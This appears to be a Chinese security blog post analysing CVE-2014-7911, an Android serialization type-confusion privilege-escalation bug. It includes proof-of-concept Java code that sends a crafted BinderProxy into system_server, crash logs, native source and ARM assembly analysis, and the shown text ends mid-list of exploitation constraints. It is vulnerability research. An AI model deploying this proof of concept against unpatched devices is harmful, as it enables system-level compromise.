<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>CVE-2014-7911安卓序列化漏洞分析 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2014-7911安卓序列化漏洞分析</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2014-7911安卓序列化漏洞分析</h1><div class="post-meta">2015-05-25<span> | </span><span class="category"><a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 5.6k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 24</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分-漏洞分析详解"><span class="toc-number">1.</span> <span class="toc-text">第一部分 漏洞分析详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Java层分析："><span class="toc-number">1.2.1.</span> <span class="toc-text">Java层分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#汇编代码分析："><span class="toc-number">1.2.2.</span> <span class="toc-text">汇编代码分析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">0x03漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文献"><span class="toc-number">1.4.</span> <span class="toc-text">参考文献</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二部分-漏洞利用详解"><span class="toc-number">2.</span> <span class="toc-text">第二部分 漏洞利用详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-回顾"><span class="toc-number">2.1.</span> <span class="toc-text">0x00 回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Dalvik-heap-Spray"><span class="toc-number">2.2.</span> <span class="toc-text">0x01 Dalvik-heap Spray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-ROP-Chain"><span class="toc-number">2.3.</span> <span class="toc-text">0x02 ROP Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Gadget1"><span class="toc-number">2.3.1.</span> <span class="toc-text">Gadget1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Gadget2"><span class="toc-number">2.3.2.</span> <span class="toc-text">Gadget2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Gadget3"><span class="toc-number">2.3.3.</span> <span class="toc-text">Gadget3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-ASLR"><span class="toc-number">2.4.</span> <span class="toc-text">0x03 ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-修复"><span class="toc-number">2.5.</span> <span class="toc-text">0x04 修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">2.6.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="post-content"><p>本文地址：<a href="http://www.ms509.com/2015/05/25/cve-2014-7911/" target="_blank" rel="noopener">http://www.ms509.com/2015/05/25/cve-2014-7911/</a></p>
<h2 id="第一部分-漏洞分析详解"><a href="#第一部分-漏洞分析详解" class="headerlink" title="第一部分 漏洞分析详解"></a>第一部分 漏洞分析详解</h2><h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，漏洞信息与POC见[1]。漏洞的成因源于在安卓系统（&lt;5.0）中，java.io.ObjectInputStream并未校验输入的java对象是否是实际可序列化的。攻击者因此可以构建一个不可序列化的java对象实例，恶意构建其成员变量，当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，使攻击者获得控制权。</p>
<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>在Jann Horm给出的漏洞信息与POC中[1]，向system_server传入的是不可序列化的android.os.BinderProxy对象实例，其成员变量在反序列化时发生类型混淆，由于BinderProxy的finalize方法包含本地代码，于是在本地代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，也就意味着攻击者可以控制该指针，使其指向攻击者可控的地址空间，最终获得在system_server（uid=1000）中执行代码的权限。下面主要结合POC对漏洞进行详细分析，由于笔者之前对相关的Java序列化、Android binder跨进程通信和native代码都不太熟悉，主要根据参考文献进行翻译、整理和理解，不当之处，还请读者海涵。</p>
<h4 id="Java层分析："><a href="#Java层分析：" class="headerlink" title="Java层分析："></a>Java层分析：</h4><p>第一步，构建一可序列化的恶意对象 </p>
<p>创建AAdroid.os.BinderProxy对象，并将其放入Bundle数据中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bundle b &#x3D; new Bundle();</span><br><span class="line">AAdroid.os.BinderProxy evilProxy &#x3D; new AAdroid.os.BinderProxy();</span><br><span class="line">b.putSerializable(&quot;eatthis&quot;, evilProxy);</span><br></pre></td></tr></table></figure>
<p>注意AAdroid.os.BinderProxy是可序列化的，其成员变量mOrgue就是随后用于改变程序执行流程的指针。随后该可序列化的AAdroid.os.BinderProxy将在传入system_server之间修改为不可序列化的Android.os.BinderProxy对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class BinderProxy implements Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID &#x3D; 0;</span><br><span class="line">   &#x2F;&#x2F;public long mObject &#x3D; 0x1337beef;</span><br><span class="line">   &#x2F;&#x2F;public long mOrgue &#x3D; 0x1337beef;</span><br><span class="line">   &#x2F;&#x2F;注意：此处要根据待测的Android版本号设置，在我们待测试的Android 4.4.4中，BinderProxy的这两个Field为private int，这样才能保证POC访问的地址为我们设置的值0x1337beef</span><br><span class="line">   private int mObject &#x3D; 0x1337beef;</span><br><span class="line">   private int mOrgue &#x3D; 0x1337beef;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二步，准备传入system_server的数据</p>
<p>主要通过一系列java的反射机制，获得android.os.IUserManager.Stub,andrioid.os.IUserManager.Stub.Proxy的Class对象，最终获得跨进程调用system_server的IBinder接口——mRemote，以及调用UserManager.setApplicationRestriction函数的code——TRANSACTION_setApplicationRestriction，为与system_server的跨进程Binder通信作准备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Class clIUserManager &#x3D; Class.forName(&quot;android.os.IUserManager&quot;);</span><br><span class="line">            Class[] umSubclasses &#x3D; clIUserManager.getDeclaredClasses();</span><br><span class="line">            System.out.println(umSubclasses.length+&quot; inner classes found&quot;);</span><br><span class="line">            Class clStub &#x3D; null;</span><br><span class="line">            for (Class c: umSubclasses) &#123;</span><br><span class="line">                &#x2F;&#x2F;it&#39;s android.os.IUserManager.Stub</span><br><span class="line">                System.out.println(&quot;inner class: &quot;+c.getCanonicalName());</span><br><span class="line">                if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub&quot;)) &#123;</span><br><span class="line">                    clStub &#x3D; c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Field fTRANSACTION_setApplicationRestrictions &#x3D;</span><br><span class="line">                    clStub.getDeclaredField(&quot;TRANSACTION_setApplicationRestrictions&quot;);</span><br><span class="line">            fTRANSACTION_setApplicationRestrictions.setAccessible(true);</span><br><span class="line">            TRANSACTION_setApplicationRestrictions &#x3D;</span><br><span class="line">                    fTRANSACTION_setApplicationRestrictions.getInt(null);</span><br><span class="line"></span><br><span class="line">            UserManager um &#x3D; (UserManager) ctx.getSystemService(Context.USER_SERVICE);</span><br><span class="line">            Field fService &#x3D; UserManager.class.getDeclaredField(&quot;mService&quot;);</span><br><span class="line">            fService.setAccessible(true);</span><br><span class="line">            Object proxy &#x3D; fService.get(um);</span><br><span class="line"></span><br><span class="line">            Class[] stSubclasses &#x3D; clStub.getDeclaredClasses();</span><br><span class="line">            System.out.println(stSubclasses.length+&quot; inner classes found&quot;);</span><br><span class="line">            clProxy &#x3D; null;</span><br><span class="line">            for (Class c: stSubclasses) &#123;</span><br><span class="line">                &#x2F;&#x2F;it&#39;s android.os.IUserManager.Stub.Proxy</span><br><span class="line">                System.out.println(&quot;inner class: &quot;+c.getCanonicalName());</span><br><span class="line">                if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub.Proxy&quot;)) &#123;</span><br><span class="line">                    clProxy &#x3D; c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Field fRemote &#x3D; clProxy.getDeclaredField(&quot;mRemote&quot;);</span><br><span class="line">            fRemote.setAccessible(true);</span><br><span class="line">            mRemote &#x3D; (IBinder) fRemote.get(proxy);&#x2F;&#x2F;获得跨进程调用system_server的IBinder接口</span><br><span class="line"></span><br><span class="line">            UserHandle me &#x3D; android.os.Process.myUserHandle();</span><br><span class="line">            setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());</span><br></pre></td></tr></table></figure>
<p>第三步，向system_server传入不可序列化的Bundle参数</p>
<p>接下来，调用setApplicationRestrictions这个函数，并传入了之前打包evilproxy的Bundle数据作为参数。将该函数与Android源码中的setApplicationRestrication函数[6]对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server的Android.os.UserManager.setApplicationRestrictions方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int</span><br><span class="line">            userHandle) throws android.os.RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        android.os.Parcel _data &#x3D; android.os.Parcel.obtain();</span><br><span class="line">        android.os.Parcel _reply &#x3D; android.os.Parcel.obtain();</span><br><span class="line">        try &#123;</span><br><span class="line">            _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">            _data.writeString(packageName);</span><br><span class="line">            _data.writeInt(1);</span><br><span class="line">            restrictions.writeToParcel(_data, 0);</span><br><span class="line">            _data.writeInt(userHandle);</span><br><span class="line">            </span><br><span class="line">            &#x2F;&#x2F;修改AAdroid.os.BinderProxy为Android.os.BinderProxy</span><br><span class="line"></span><br><span class="line">            byte[] data &#x3D; _data.marshall();</span><br><span class="line">            for (int i&#x3D;0; true; i++) &#123;</span><br><span class="line">                if (data[i] &#x3D;&#x3D; &#39;A&#39; &amp;&amp; data[i+1] &#x3D;&#x3D; &#39;A&#39; &amp;&amp; data[i+2] &#x3D;&#x3D; &#39;d&#39; &amp;&amp; data[i+3] &#x3D;&#x3D; &#39;r&#39;) &#123;</span><br><span class="line">                    data[i] &#x3D; &#39;a&#39;;</span><br><span class="line">                    data[i+1] &#x3D; &#39;n&#39;;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            _data.recycle();</span><br><span class="line">            _data &#x3D; Parcel.obtain();</span><br><span class="line">            _data.unmarshall(data, 0, data.length);</span><br><span class="line">            &#x2F;**</span><br><span class="line">            通过Binder机制跨进程调用Android.os.UserManager.setApplicationRestrictions方法，</span><br><span class="line">            向system_server传入的是实际不可序列化的Android.os.BinderProxy对象</span><br><span class="line">            *&#x2F;</span><br><span class="line">            mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);</span><br><span class="line">            _reply.readException();</span><br><span class="line">        &#125;</span><br><span class="line">        finally &#123;</span><br><span class="line">            _reply.recycle();</span><br><span class="line">            _data.recycle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>安装POC，启动Activity后将其最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，system_server执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问了不该访问的内存，导致异常。错误信号、寄存器快照和调用栈如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">05-14 18:30:55.974: I&#x2F;DEBUG(3695): Build fingerprint: &#39;google&#x2F;hammerhead&#x2F;hammerhead:4.4.4&#x2F;KTU84P&#x2F;1227136:user&#x2F;release-keys&#39;</span><br><span class="line">05-14 18:30:55.974: I&#x2F;DEBUG(3695): Revision: &#39;11&#39;</span><br><span class="line">05-14 18:30:55.974: I&#x2F;DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;</span><br><span class="line">05-14 18:30:55.974: I&#x2F;DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef3</span><br><span class="line">05-14 18:30:56.064: I&#x2F;DEBUG(3695):     r0 1337beef  r1 401b89d9  r2 746fdad8  r3 6d4fbdc4</span><br><span class="line">05-14 18:30:56.064: I&#x2F;DEBUG(3695):     r4 401b89d9  r5 1337beef  r6 713e3f68  r7 1337beef</span><br><span class="line">05-14 18:30:56.064: I&#x2F;DEBUG(3695):     r8 1337beef  r9 74709f68  sl 746fdae8  fp 74aacb24</span><br><span class="line">05-14 18:30:56.064: I&#x2F;DEBUG(3695):     ip 401f08a4  sp 74aacae8  lr 401b7981  pc 40105176  cpsr 200d0030</span><br><span class="line">...</span><br><span class="line">I&#x2F;DEBUG   (  241): backtrace:</span><br><span class="line">I&#x2F;DEBUG   (  241):     #00  pc 0000d176  &#x2F;system&#x2F;lib&#x2F;libutils.so (android::RefBase::decStrong(void const*) const+3)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #01  pc 0007097d  &#x2F;system&#x2F;lib&#x2F;libandroid_runtime.so</span><br><span class="line">I&#x2F;DEBUG   (  241):     #02  pc 0001dbcc  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmPlatformInvoke+112)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #03  pc 0004e123  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #04  pc 00026fe0  &#x2F;system&#x2F;lib&#x2F;libdvm.so</span><br><span class="line">I&#x2F;DEBUG   (  241):     #05  pc 0002dfa0  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmMterpStd(Thread*)+76)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #06  pc 0002b638  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #07  pc 0006057d  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #08  pc 000605a1  &#x2F;system&#x2F;lib&#x2F;libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #09  pc 00055287  &#x2F;system&#x2F;lib&#x2F;libdvm.so</span><br><span class="line">I&#x2F;DEBUG   (  241):     #10  pc 0000d170  &#x2F;system&#x2F;lib&#x2F;libc.so (__thread_entry+72)</span><br><span class="line">I&#x2F;DEBUG   (  241):     #11  pc 0000d308  &#x2F;system&#x2F;lib&#x2F;libc.so (pthread_create+240)</span><br></pre></td></tr></table></figure>
<p>####Native层分析:</p>
<p>假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个filed就是之前设置的0x1337beef，具体而言，就是mOrgue这个变量。</p>
<p>android.os.BinderProxy 的finalize方法调用native代码，将mOrgue处理为指针.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">protected void finalize() throws Throwable &#123;</span><br><span class="line">    destroy();</span><br><span class="line">    super.finalize();</span><br><span class="line">    return;</span><br><span class="line">    Exception exception;</span><br><span class="line">    exception;</span><br><span class="line">    super.finalize();</span><br><span class="line">    throw exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，destroy为native方法</p>
<pre><code>private final native void destroy();</code></pre><p>cpp代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj)</span><br><span class="line">&#123;</span><br><span class="line">    IBinder* b &#x3D; (IBinder*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    DeathRecipientList* drl &#x3D; (DeathRecipientList*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">    LOGDEATH(&quot;Destroying BinderProxy %p: binder&#x3D;%p drl&#x3D;%p\n&quot;, obj, b, drl);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);</span><br><span class="line">    drl-&gt;decStrong((void*)javaObjectForIBinder);</span><br><span class="line">    b-&gt;decStrong((void*)javaObjectForIBinder);</span><br><span class="line">    IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终native代码调用上述decStrong方法，从</p>
<pre><code>DeathRecipientList* drl = (DeathRecipientList*)
        env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</code></pre><p>这一行可以看出，drl就是mOrgue，可以被攻击者控制。<br>所以，drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。</p>
<p>再看一下RefBase类中的decStrong方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void RefBase::decStrong(const void* id) const</span><br><span class="line">&#123;</span><br><span class="line">    weakref_impl* const refs &#x3D; mRefs;</span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    const int32_t c &#x3D; android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line">#if PRINT_REFS</span><br><span class="line">    ALOGD(&quot;decStrong of %p from %p: cnt&#x3D;%d\n&quot;, this, id, c);</span><br><span class="line">#endif</span><br><span class="line">    ALOG_ASSERT(c &gt;&#x3D; 1, &quot;decStrong() called on %p too many times&quot;, refs);</span><br><span class="line">    if (c &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) &#x3D;&#x3D; OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            delete this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意上述refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致代码执行。</p>
<h4 id="汇编代码分析："><a href="#汇编代码分析：" class="headerlink" title="汇编代码分析："></a>汇编代码分析：</h4><p>下面看一下发生异常时最后调用的RefBase:decStrong的汇编代码。将libutils.so拖入IDA Pro，查看Android::RefBase::decStrong函数。分析时需要牢记的是，攻击者能够控制r0(this指针)</p>
<p><img src="/2015/05/25/cve-2014-7911/Decstrong.png" alt="image"></p>
<p>首先对r0的使用，是在decStrong的前下面三行代码之中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weakref_impl* const refs &#x3D; mRefs;</span><br><span class="line">refs-&gt;removeStrongRef(id);</span><br><span class="line">const int32_t c &#x3D; android_atomic_dec(&amp;refs-&gt;mStrong);</span><br></pre></td></tr></table></figure>
<p>对应的汇编代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldr     r4, [r0, #4]   # r0为this指针，r4为mRefs</span><br><span class="line">mov     r6, r1</span><br><span class="line">mov     r0, r4</span><br><span class="line">blx     &lt;android_atomic_dec ()&gt;</span><br></pre></td></tr></table></figure>
<p>首先，mRefs被加载到r4。（r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容）</p>
<p>然后，android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong.</p>
<pre><code>const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);</code></pre><p>这被翻译为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     r0, r4	# r4指向mStrong，r0指向mStrong</span><br><span class="line">blx     &lt;android_atomic_dec ()&gt;</span><br></pre></td></tr></table></figure>
<p>作为函数参数，上述r0就是&amp;refs-&gt;mStrong。注意，mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。</p>
<p>另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示。</p>
<pre><code>void removeStrongRef(const void* /*id*/) { }</code></pre><p>在调用android_atomic_dec后，出现的是以下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (c &#x3D;&#x3D; 1) &#123;</span><br><span class="line">	refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br></pre></td></tr></table></figure>
<p>对应的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmp     r0, #1          # r0 &#x3D; refs-&gt;mStrong</span><br><span class="line">bne.n   d1ea</span><br><span class="line">ldr     r0, [r4, #8]    # r4 &#x3D; &amp;refs-&gt;mStrong</span><br><span class="line">mov     r1, r6</span><br><span class="line">ldr     r3, [r0, #0] </span><br><span class="line">ldr     r2, [r3, #12]</span><br><span class="line">blx     r2</span><br></pre></td></tr></table></figure>
<p>注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&gt;mStrong为1.</p>
<p>至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件：</p>
<ol>
<li>drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域;</li>
<li>refs-&gt;mStrong必须为1;</li>
<li>refs-&gt;mBase-&gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足</li>
</ol>
